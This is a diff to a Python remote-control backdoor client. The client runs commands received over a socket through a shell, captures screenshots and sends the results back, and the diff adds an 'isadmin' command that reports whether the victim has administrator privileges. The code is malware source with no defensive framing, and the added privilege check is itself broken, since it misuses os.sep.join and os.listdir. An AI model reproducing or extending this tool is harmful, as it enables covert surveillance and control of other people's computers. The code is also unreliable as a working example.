@@ -33,6 +33,14 @@ def reliable_recv(_s):
             continue
 
 
+def is_admin():
+    try:
+        temp = os.listdir([os.sep.join(os.environ.get('SystemRoot', 'C:\\windows'), 'temp')])
+    except:
+        return False
+    else:
+        return True
+
 def screenshot():
     with mss() as ss:
         ss.shot()
@@ -96,6 +104,11 @@ def shell(_s):
                 os.remove('monitor-1.png')
             except:
                 reliable_send(_s, '[!] Failed to take the screenshot!!')
+        elif cmd[:7] == 'isadmin':
+            if is_admin():
+                reliable_send(_s, '[+] The user HAS Admin priviledges!')
+            else:
+                reliable_send(_s, '[!] The user does NOT has Admin priviledges!')
         else:
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
